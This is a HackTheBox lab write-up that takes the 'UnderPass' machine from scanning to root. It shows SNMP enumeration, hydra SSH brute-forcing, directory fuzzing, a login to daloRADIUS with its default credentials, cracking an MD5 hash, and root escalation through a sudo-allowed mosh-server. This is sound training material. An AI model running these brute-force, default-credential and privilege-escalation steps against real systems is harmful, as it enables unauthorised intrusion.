---
render_with_liquid: false
title: HackTheBox Writeup - UnderPass
date: 2024-12-22 07:55 +1400
tags: [hackthebox, nmap, linux, snmp, feroxbuster, snmpbulkwalk, snmpwalk, snmp-check, onesixtyone, enum, hashcat, hashcat-rules, fuzzing, daloradius, default-credentials, discover-secrets, crackstation, credentials-stuffing, sudo]
image:
    path: https://labs.hackthebox.com/storage/avatars/456a4d2e52f182847fb0a2dba0420a44.png
    width: 640
    height: 480
---



Underpass is an Easy Linux machine starting with a default Apache Ubuntu page. This leads the attacker to enumerate the machine&#039;s UDP ports for alternative attack vectors. The attacker can enumerate SNMP and discover that `Daloradius` is running on the remote machine, and the operators panel can be accessed using the default credentials. Inside the panel, the password hash for the user `svcMosh` is stored, and it's crackable. Then, the attacker can log in to the remote machine using SSH with the credentials they have obtained. The user `svcMosh` is configured to run `mosdh-server` as `root`, which allows the attacker to connect to the server from their local machine and interact with the remote machine as the `root` user.

# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ pt init '10.129.166.47 underpass.htb'
+-----------+--------+---------------+---------------+
|  PROFILE  | STATUS |      IP       |    DOMAIN     |
+-----------+--------+---------------+---------------+
| underpass | on     | 10.129.166.47 | underpass.htb |
+-----------+--------+---------------+---------------+
```

## Nmap

```bash
# Nmap 7.94SVN scan initiated Sun Dec 22 07:55:11 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.166.47
Nmap scan report for 10.129.166.47
Host is up, received user-set (0.29s latency).
Scanned at 2024-12-22 07:55:11 CST for 20s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 22 07:55:31 2024 -- 1 IP address (1 host up) scanned in 20.12 seconds
```

```bash
[+] Running command: sudo nmap -sU -p- --min-rate 10000 --open -Pn -vv -oA ./nmap/all_udp_ports --open 10.129.166.47
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 07:55 CST
Initiating Parallel DNS resolution of 1 host. at 07:55
Completed Parallel DNS resolution of 1 host. at 07:55, 0.01s elapsed
Initiating UDP Scan at 07:55
Scanning 10.129.166.47 [65535 ports]
Increasing send delay for 10.129.166.47 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.129.166.47 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.129.166.47 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.129.166.47 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.129.166.47 from 400 to 800 due to max_successful_tryno increase to 8
Discovered open port 161/udp on 10.129.166.47
Increasing send delay for 10.129.166.47 from 800 to 1000 due to 11 out of 12 dropped probes since last increase.
Warning: 10.129.166.47 giving up on port because retransmission cap hit (10).
UDP Scan Timing: About 42.34% done; ETC: 07:56 (0:00:42 remaining)
Completed UDP Scan at 07:56, 74.28s elapsed (65535 total ports)
Nmap scan report for 10.129.166.47
Host is up, received user-set (0.29s latency).
Scanned at 2024-12-22 07:55:31 CST for 74s
Not shown: 65455 open|filtered udp ports (no-response), 79 closed udp ports (port-unreach)
PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 74.54 seconds
           Raw packets sent: 721487 (34.850MB) | Rcvd: 81 (6.452KB)
```

## 80 - HTTP : Apache2 Ubuntu Default Page


### Info

```ruby
http://10.129.166.47 [200] [Apache2 Ubuntu Default Page: It works] [Apache/2.4.52 (Ubuntu)] [152a75d80c0bdadb382e1cafe517159cb76a19cc] [Apache HTTP Server:2.4.52,Ubuntu]
```

![](/assets/obsidian/89e0ec206dbe33e45d9e8483e3bc1268.png)

### Directory

```bash
URL="$(pt get rhost):80"; feroxbuster -k -A -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -u "http://$URL" -o ferox_$URL.txt
```

```bash
200      GET       22l      105w     5952c http://10.129.166.47/icons/ubuntu-logo.png
200      GET      363l      961w    10671c http://10.129.166.47/
```

## 161 - SNMP


### Low hanging fruit

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ snmpbulkwalk -c public -v2c $(pt get rhost) HOST-RESOURCES-MIB::hrSWRunParameters
HOST-RESOURCES-MIB::hrSWRunParameters = No more variables left in this MIB View (It is past the end of the MIB tree)

┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ snmpwalk -v2c -c public $(pt get rhost) NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull = No more variables left in this MIB View (It is past the end of the MIB tree)

┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ snmpwalk -v2c -c public $(pt get rhost) NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendObjects = No more variables left in this MIB View (It is past the end of the MIB tree)
```

### Full scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ snmp-check -v2c -w $(pt get rhost) | tee snmp-check.txt
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.166.47:161 using SNMPv2c and community 'public'
[+] Write access check enabled

[*] Write access not permitted!
[*] System information:

  Host IP address               : 10.129.166.47
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 01:57:08.86
  Uptime system                 : 01:56:56.90
  System date                   : 2024-12-22 00:00:51.0

[*] Network information:

  Default TTL                   : noSuchObject
  TCP segments received         : noSuchObject
  TCP segments sent             : noSuchObject
  TCP segments retrans          : noSuchObject
  Input datagrams               : noSuchObject
  Delivered datagrams           : noSuchObject
  Output datagrams              : noSuchObject

[*] File system information:

  Index                         : noSuchObject
  Mount point                   : noSuchObject
  Access                        : noSuchObject
  Bootable                      : noSuchObject
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ snmpbulkwalk -c public -v2c $(pt get ip) . | tee snmpbulkwalk.txt
SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (767616) 2:07:56.16
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (2) 0:00:00.02
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (768868) 2:08:08.68
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2024-12-22,0:11:50.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 318
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

### Brute force community strings

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ onesixtyone $(pt get ip) -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
Scanning 1 hosts, 3218 communities
10.129.166.47 [public] Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
10.129.166.47 [public] Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64

┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ onesixtyone $(pt get ip) -c <(echo underpass)
Scanning 1 hosts, 1 communities
```


# User Flag
---

## Shell as svcMosh

### Generate wordlist based on keywords

- Apparently there're only 2 things interesting. The `apache default page` implies there might be a hidden directory. The strings retrieved from SNMP could be used for web fuzzing and password brute force

> `keywords.txt`

```
steve
underpass
daloradius
basin
```

Use **hashcat** rule to generate variations

```bash
hashcat --force --stdout keywords.txt -r /usr/share/hashcat/rules/best64.rule > keywords_best64.txt
```

### 22 - (Failed) Password brute force

```bash
hydra -e nsr -l steve -P /usr/share/seclists/Passwords/darkweb2017-top100.txt ssh://$(pt get rhost) -I
hydra -e nsr -l steve -P keywords_best64.txt ssh://$(pt get rhost) -I
hydra -e nsr -l steve -P /opt/wordlists/rockyou.txt ssh://$(pt get rhost) -I
```

### 80 - (Failed) Fuzz virtual hosts

```bash
gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 100 -u http://underpass.htb
gobuster vhost --append-domain -o gobuster_vhosts.txt -w keywords_best64.txt -k -t 100 -u http://underpass.htb
```

### 80 - Fuzz directories based on keywords

Although previous scan only discovered a directory, it is still a good practice to extract directories from URLs for other situations

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ cat ferox_*.txt bulkdirb_*.txt | ferox-parse | grep -vE '^4|^5' | grep '/$' | awk 'NF>1{print $NF}' | anew dirs.txt
http://underpass.htb/
```

Fuzz with keywords

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ cat dirs.txt | feroxbuster --stdin -k -A -w keywords_best64.txt -C 404,400,500 -r --dont-filter
[...]
403      GET        9l       28w      278c http://underpass.htb/icons/
403      GET        9l       28w      278c http://underpass.htb/daloradius/
200      GET       22l      105w     5952c http://underpass.htb/icons/ubuntu-logo.png
200      GET      363l      961w    10671c http://underpass.htb/
[####################] - 13s      932/932     0s      found:4       errors:0
[####################] - 10s      309/309     31/s    http://underpass.htb/
[####################] - 7s       309/309     44/s    http://underpass.htb/icons/
[####################] - 6s       309/309     51/s    http://underpass.htb/daloradius/
```

Fuzz `http://underpass.htb/daloradius/`

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ URL="$(pt get rhost):80/daloradius/"; feroxbuster -k -A -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt --scan-dir-listings -C 404,400,500 --dont-scan "/server-status/" -t 20 -r -u "http://$URL"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://underpass.htb:80/daloradius/
 🚫  Don't Scan Regex      │ /server-status/
 🚀  Threads               │ 20
 📖  Wordlist              │ /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt
 💢  Status Code Filters   │ [404, 400, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       12l       11w      221c http://underpass.htb/daloradius/.gitignore
200      GET      412l     3898w    24703c http://underpass.htb/daloradius/ChangeLog
200      GET       66l      119w     1537c http://underpass.htb/daloradius/docker-compose.yml
200      GET       80l      268w     2182c http://underpass.htb/daloradius/Dockerfile
200      GET      340l     2968w    18011c http://underpass.htb/daloradius/LICENSE
200      GET      438l     2145w   183028c http://underpass.htb/daloradius/app/common/static/images/daloradius_logo.jpg
200      GET      195l     1296w     9912c http://underpass.htb/daloradius/README.md
200      GET       22l      105w     5952c http://underpass.htb/icons/ubuntu-logo.png
200      GET      363l      961w    10671c http://underpass.htb/
200      GET      112l      352w     4421c http://underpass.htb/daloradius/app/users/login.php
200      GET        7l       21w     1707c http://underpass.htb/daloradius/app/users/static/images/favicon/favicon-16x16.png
200      GET       19l      120w    10373c http://underpass.htb/daloradius/app/users/static/images/daloradius_small.png
200      GET        1l        1w      263c http://underpass.htb/daloradius/app/users/static/images/favicon/site.webmanifest
200      GET       15l       70w     5742c http://underpass.htb/daloradius/app/users/static/images/favicon/favicon-32x32.png
200      GET        7l     1222w    80420c http://underpass.htb/daloradius/app/users/static/js/bootstrap.bundle.min.js
200      GET      146l      911w    74623c http://underpass.htb/daloradius/app/users/static/images/favicon/apple-touch-icon.png
200      GET        5l       21w    85875c http://underpass.htb/daloradius/app/users/static/css/icons/bootstrap-icons.min.css
200      GET        7l     2189w   194901c http://underpass.htb/daloradius/app/users/static/css/bootstrap.min.css
200      GET      363l      961w    10671c http://underpass.htb/index.html
200      GET      247l     1010w     7814c http://underpass.htb/daloradius/doc/install/INSTALL
[####################] - 2m     43649/43649   0s      found:20      errors:23
[####################] - 71s     4843/4843    68/s    http://underpass.htb:80/daloradius/
[####################] - 71s     4843/4843    69/s    http://underpass.htb/daloradius/
[####################] - 72s     4843/4843    67/s    http://underpass.htb/daloradius/app/
[####################] - 73s     4843/4843    67/s    http://underpass.htb/daloradius/doc/
[####################] - 70s     4843/4843    69/s    http://underpass.htb/daloradius/app/common/
[####################] - 69s     4843/4843    70/s    http://underpass.htb/
[####################] - 69s     4843/4843    70/s    http://underpass.htb/daloradius/setup/
[####################] - 69s     4843/4843    70/s    http://underpass.htb/daloradius/doc/install/
[####################] - 1s      4843/4843    5738/s  http://underpass.htb/server-status/ 
```


### 80 - daloRADIUS : Default credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ curl http://underpass.htb/daloradius/README.md -s | head
<p align="center">
  <img width="213" height="190" src="app/common/static/images/daloradius_logo.jpg">
</p>

**daloRADIUS** is an advanced RADIUS web management application for managing hotspots and general-purpose ISP deployments. It features user management, graphical reporting, accounting, a billing engine, and integrates with [OpenStreetMap](https://www.openstreetmap.org/copyright) for geolocation. The system is based on [FreeRADIUS](https://freeradius.org/) with which it shares access to the backend database.

**daloRADIUS** is written using the [PHP programming language](https://www.php.net/) and uses a [database abstraction layer](https://en.wikipedia.org/wiki/Database_abstraction_layer) (DAL) for database access. Although DAL allows the use of different [database management systems](https://en.wikipedia.org/wiki/Database#Database_management_system) (DBMSs) (e.g., MariaDB, MySQL, PostgreSQL, SQLite, MsSQL, etc.), **it is important to note that daloRADIUS has been fully tested only on the [MariaDB](https://mariadb.org/) DBMS**. Therefore, **the use of other DBMSs is not recommended**.

## Installation
### quick installation
```

- Google : `daloRADIUS github`

> https://github.com/lirantal/daloradius

![](/assets/obsidian/4d0e19777759dfc0f6fee756ccf9b717.png)

- The latest release version is `1.3`

![](/assets/obsidian/ce7e5b1b7e2a760b31fd3b2a865ad552.png)

- There's a `operators` folder besides `users` inside `app` folder

![](/assets/obsidian/fc0a2793df6323649243eb905d64507c.png)

> underpass.htb/daloradius/app/operators/ -> http://underpass.htb/daloradius/app/operators/login.php

- The machine is running version `2.2 beta` which have no known exploits

![](/assets/obsidian/0508122dc0c98c74f621e57830a839ab.png)

> https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS

- The default credential is : `administrator:radius`

![](/assets/obsidian/37c1763e59c81305c8d3a5d855f20ae1.png)

The credential is valid

![](/assets/obsidian/bacb4d664e67f201558c1b3d0ef75903.png)

![](/assets/obsidian/b5a9e6f60a6a171f12d7424805ff78b5.png)

### 80 - daloRADIUS : Discovered user hash in management dashboard

> http://underpass.htb/daloradius/app/operators/mng-main.php

![](/assets/obsidian/8aa4651e8b6ee141d4ba3133af505d9d.png)

> http://underpass.htb/daloradius/app/operators/mng-list-all.php

- User `svcMosh` have a md5 password hash : `412DD4759978ACFCC81DEAB01B382403`

![](/assets/obsidian/c2e4af22094a301b13da066748312a8b.png)

md5 hashes are very weak, use https://crackstation.net/ to search up the hash, found : `underwaterfriends`

![](/assets/obsidian/87b268e9317a6f5f956a06c21b60ea62.png)

### 22 - SSH : Credential stuffing

We've got a username `steve` from SNMP strings, `svcMosh` could be setup by the user and share the same password

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ cssh 10.129.172.212 steve 'underwaterfriends'
Warning: Permanently added 'underpass.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.
```

Nope, try with `svcMosh` instead

```bash
┌──(bravosec㉿fsociety)-[~/htb/UnderPass]
└─$ cssh 10.129.172.212 svcMosh 'underwaterfriends'
Warning: Permanently added '10.129.172.212' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Dec 23 12:47:38 AM UTC 2024

  System load:  0.0               Processes:             222
  Usage of /:   87.7% of 3.75GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.129.172.212
  Swap usage:   0%

  => / is using 87.7% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Thu Dec 12 15:45:42 2024 from 10.10.14.65
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
svcMosh@underpass:~$ cat user.txt
ef5d29c62aee5f14318eaab6b44d7071
```

# Root Flag
---

## From svcMosh to root


### SUDO - Mosh server

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

> **What is mosh?**
> 
> **Mosh** (mobile shell) is a replacement of SSH to adapt bad environments where network is slow and unstable
{: .prompt-info }

It shows `MOSH CONNECT 60001 tcygugXVwndG1FjkHnls7g` after running, `60001` could be a port number and `tcygugXVwndG1FjkHnls7g` could be a security token

```bash
svcMosh@underpass:~$ sudo /usr/bin/mosh-server


MOSH CONNECT 60001 tcygugXVwndG1FjkHnls7g

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2477]
```

UDP port `60001` is listening on `0.0.0.0`

```bash
svcMosh@underpass:~$ ss -ltnpu
Netid                State                 Recv-Q                Send-Q                               Local Address:Port                                 Peer Address:Port                Process
udp                  UNCONN                0                     0                                          0.0.0.0:52801                                     0.0.0.0:*
udp                  UNCONN                0                     0                                        127.0.0.1:18120                                     0.0.0.0:*
udp                  UNCONN                0                     0                                          0.0.0.0:1812                                      0.0.0.0:*
udp                  UNCONN                0                     0                                          0.0.0.0:1813                                      0.0.0.0:*
udp                  UNCONN                0                     0                                    127.0.0.53%lo:53                                        0.0.0.0:*
udp                  UNCONN                0                     0                                          0.0.0.0:68                                        0.0.0.0:*
udp                  UNCONN                0                     0                                          0.0.0.0:161                                       0.0.0.0:*
udp                  UNCONN                0                     0                                          0.0.0.0:60001                                     0.0.0.0:*
udp                  UNCONN                0                     0                                             [::]:1812                                         [::]:*
udp                  UNCONN                0                     0                                             [::]:1813                                         [::]:*
udp                  UNCONN                0                     0                                             [::]:59347                                        [::]:*
tcp                  LISTEN                0                     128                                        0.0.0.0:22                                        0.0.0.0:*
tcp                  LISTEN                0                     511                                        0.0.0.0:80                                        0.0.0.0:*
tcp                  LISTEN                0                     80                                       127.0.0.1:3306                                      0.0.0.0:*
tcp                  LISTEN                0                     4096                                 127.0.0.53%lo:53                                        0.0.0.0:*
tcp                  LISTEN                0                     128                                           [::]:22                                           [::]:*
```

- Google : `mosh-server`

> https://mosh.org/

![](/assets/obsidian/1283d647500db7c78e26b3720d3651f3.png)

Connect to the `root` session with **mosh-client**

```bash
svcMosh@underpass:~$ MOSH_KEY='tcygugXVwndG1FjkHnls7g' mosh-client 127.0.0.1 60001
```

```bash
mosh did not make a successful connection to 127.0.0.1:60001.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Dec 22 08:52:07 AM UTC 2024

  System load:  0.02              Processes:             224
  Usage of /:   88.0% of 3.75GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.129.78.67
  Swap usage:   0%

  => / is using 88.0% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status




root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# cat root.txt
5fe165d8f5d1b44ecfe98d259c874bcb
```

# Additional
---
